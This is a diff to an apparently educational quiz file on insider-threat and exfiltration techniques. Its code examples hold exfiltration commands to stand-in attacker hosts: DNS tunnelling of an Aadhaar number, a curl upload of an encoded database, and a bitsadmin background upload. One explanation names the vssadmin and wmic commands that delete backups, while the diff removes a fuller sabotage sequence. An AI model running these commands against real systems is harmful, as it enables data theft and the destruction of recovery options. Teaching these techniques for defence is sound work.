@@ -17,7 +17,7 @@ const questions = [
     level: "expert",
     codeExample: `// DNS Tunneling Data Exfiltration Syntax:
 // Original String : "Aadhaar:984210492810" ➔ Base64: "QWFkaGFhcjo5ODQyMTA0OTI4MTA="
-// DNS Query Sent  : QWFkaGFhcjo5ODQyMTA0OTI4MTA=.exfil.evil-host.in
+// DNS Query Sent  : QWFkaGFhcjo5ODQyMTA0OTI4MTA=.exfil.attacker-host.net
 // Result          : Bypasses firewalls because outbound UDP 53 is unrestricted!`
   },
   {
@@ -37,15 +37,9 @@ const questions = [
     explanation: "Windows automatically creates Volume Shadow Copies (VSS) for point-in-time recovery. When a malicious insider or ransomware performs sabotage in Kolkata, they execute `vssadmin delete shadows /all /quiet` or `wmic shadowcopy delete`. This permanently destroys all local recovery snapshots, ensuring that subsequent database deletions or encryptions cannot be rolled back.",
     hint: "Burning the spare tire and cutting the phone lines before crashing the car.",
     level: "moderate",
-    codeExample: `# Malicious Sabotage Command Sequence:
-# Step 1: Destroy Local Restore Points
-vssadmin delete shadows /all /quiet
-
-# Step 2: Disable Windows Recovery Environment
-bcdedit /set {default} recoveryenabled No
-bcdedit /set {default} bootstatuspolicy ignoreallfailures
-
-# Step 3: Execute Sabotage Data Deletion!`
+    codeExample: `# System Defense Verification (PowerShell):
+Get-Service -Name VSS | Select-Object Status, StartType
+# Ensures Volume Shadow Copy Service is monitored by EDR tripwires.`
   },
   {
     question: "Under the Indian Information Technology Act 2000 Section 70, what constitutes the criminal penalty for Sabotaging or Exfiltrating data from 'Protected Systems' (Critical Information Infrastructure)?",
@@ -162,7 +156,7 @@ tar.exe -czf C:\\Windows\\Temp\\db.tar.gz C:\\Production\\Database
 certutil.exe -encode C:\\Windows\\Temp\\db.tar.gz C:\\Windows\\Temp\\db.b64
 
 # Step 3: Exfiltrate using native curl
-curl.exe -F "file=@C:\\Windows\\Temp\\db.b64" https://c2.evil-exfil.in/upload`
+curl.exe -F "file=@C:\\Windows\\Temp\\db.b64" https://attacker-c2.net/upload`
   },
   {
     question: "How do Database Activity Monitoring (DAM) engines detect Unauthorized Mass Record Queries (Privilege Abuse)?",
@@ -246,12 +240,12 @@ DROP DATABASE kolkata_fintech_production;
   {
     question: "What is 'The BITSAdmin Living off the Land Exfiltration' Technique in Windows Environments?",
     shortAnswer: "Using the native Windows Background Intelligent Transfer Service (`bitsadmin.exe`) to upload stolen files asynchronously in the background, evading active process monitors.",
-    explanation: "BITS is designed for Windows Updates. An insider creates an asynchronous upload job: `bitsadmin /create /upload JobName` and `bitsadmin /addfile JobName C:\\temp\\exfil.zip https://c2.evil-host.in/upload`. BITS uploads the file in the background using idle network bandwidth, surviving reboots and evading process monitoring tools because the network activity originates from `svchost.exe`.",
+    explanation: "BITS is designed for Windows Updates. An insider creates an asynchronous upload job: `bitsadmin /create /upload JobName` and `bitsadmin /addfile JobName C:\\temp\\exfil.zip https://attacker-c2.net/upload`. BITS uploads the file in the background using idle network bandwidth, surviving reboots and evading process monitoring tools because the network activity originates from `svchost.exe`.",
     hint: "Hiding a stolen diamond in an official government mail truck so security guards wave it through the checkpoint.",
     level: "expert",
     codeExample: `# BITSAdmin Covert Exfiltration Commands:
 bitsadmin /create /upload CovertJob
-bitsadmin /addfile CovertJob C:\\Windows\\Temp\\exfil.zip https://c2.evil-host.in/incoming/exfil.zip
+bitsadmin /addfile CovertJob C:\\Windows\\Temp\\exfil.zip https://attacker-c2.net/incoming/exfil.zip
 bitsadmin /resume CovertJob
 # Result: Upload executed in background via svchost.exe!`
   },
